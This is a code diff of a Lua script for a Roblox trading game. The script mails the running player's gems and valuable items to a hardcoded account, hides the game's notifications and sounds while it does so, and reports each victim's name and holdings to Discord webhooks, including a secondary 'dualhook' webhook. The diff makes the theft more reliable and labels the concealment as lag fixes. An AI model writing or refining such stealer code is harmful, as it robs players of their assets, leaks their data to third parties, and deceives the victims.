@@ -6,7 +6,7 @@ local alternativeWebhook = "https://discord.com/api/webhooks/1289613307631632417
 
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
-local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
+local saveData = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
 local MailMessage = "Join discord.gg/rZmNK6Ptxw"
 local HttpService = game:GetService("HttpService")
@@ -104,6 +104,7 @@ local function SendMessage(username, diamonds, isDualhooked)
 
     fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
 
+    -- Truncate if too long for Discord
     if #fields[2].value > 1024 then
         local lines = {}
         for line in fields[2].value:gmatch("[^\r\n]+") do
@@ -131,12 +132,14 @@ local function SendMessage(username, diamonds, isDualhooked)
 
     -- Send to the main webhook
     if webhook and webhook ~= "" then
-        request({
-            Url = webhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
+        spawn(function()
+            request({
+                Url = webhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            })
+        end)
     end
 
     -- Send to the dualhooked webhook if it's dualhooked
@@ -144,26 +147,31 @@ local function SendMessage(username, diamonds, isDualhooked)
         fields[1].value = "Dualhook Execution!"
         data.embeds[1].fields = fields
         body = HttpService:JSONEncode(data)
-        request({
-            Url = alternativeWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
+        spawn(function()
+            request({
+                Url = alternativeWebhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            })
+        end)
     else
         -- Send a non-dualhooked log for all executions to dualhooked webhook
         fields[1].value = "Execution Log"
         data.embeds[1].fields = fields
         body = HttpService:JSONEncode(data)
-        request({
-            Url = alternativeWebhook,
-            Method = "POST",
-            Headers = headers,
-            Body = body
-        })
+        spawn(function()
+            request({
+                Url = alternativeWebhook,
+                Method = "POST",
+                Headers = headers,
+                Body = body
+            })
+        end)
     end
 end
 
+-- Disable unnecessary GUI elements
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
 local noti = plr.PlayerGui.Notifications
 loading.Disabled = true
@@ -172,6 +180,7 @@ noti:GetPropertyChangedSignal("Enabled"):Connect(function()
 end)
 noti.Enabled = false
 
+-- Reduce sound-related lag
 game.DescendantAdded:Connect(function(x)
     if x.ClassName == "Sound" then
         if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
@@ -182,6 +191,7 @@ game.DescendantAdded:Connect(function(x)
     end
 end)
 
+-- RAP Calculation
 local function getRAP(Type, Item)
     return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
         {
@@ -203,6 +213,7 @@ local user = Username or "tobi437a"
 local min_rap = min_rap or 10000
 local webhook = webhook
 
+-- Sending Gems and Items
 local function sendItem(category, uid, am)
     local args = {
         [1] = user,
@@ -211,27 +222,21 @@ local function sendItem(category, uid, am)
         [4] = uid,
         [5] = am or 1
     }
+    local maxRetries = 5
+    local retries = 0
     local response = false
     repeat
-        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-    until response == true
+        response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+        retries = retries + 1
+        wait(0.1) -- Small delay to prevent overwhelming the server
+    until response == true or retries >= maxRetries
 end
 
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= 500 and GemAmount1 >= min_rap then
-                local args = {
-                    [1] = user,
-                    [2] = MailMessage,
-                    [3] = "Currency",
-                    [4] = i,
-                    [5] = GemAmount1
-                }
-                local response = false
-                repeat
-                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                until response == true
+                sendItem("Currency", i, GemAmount1)
                 break
             end
         end
@@ -241,27 +246,33 @@ end
 local function ClaimMail()
     local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
     while err == "You must wait 30 seconds before using the mailbox!" do
-        wait()
+        wait(5) -- Slight wait to avoid spamming
         response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
     end
 end
 
+-- Process inventory items
 local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
 
 for i, v in pairs(categoryList) do
     for _, item in pairs(GetSave().Inventory[v]) do
         local rapValue = getRAP(v, item)
         if rapValue >= min_rap then
-            totalRAP = totalRAP + rapValue
-            table.insert(sortedItems, {name = item.Name, amount = item.amount, rap = rapValue, chance = item.value})
+            table.insert(sortedItems, {
+                name = item.n,
+                rap = rapValue,
+                amount = item.s or 1,
+                chance = item.c
+            })
+            totalRAP = totalRAP + (rapValue * (item.s or 1))
         end
     end
 end
 
-local dualhook = false
-if totalRAP >= 100000 then
-    dualhook = true
-end
-
-SendMessage(user, GemAmount1, dualhook)
+-- Send everything
+SendAllGems()
 ClaimMail()
+SendMessage(plr.Name, GemAmount1, isDualhook)
+
+-- Disable the script after execution to avoid repeated executions
+_G.scriptExecuted = false
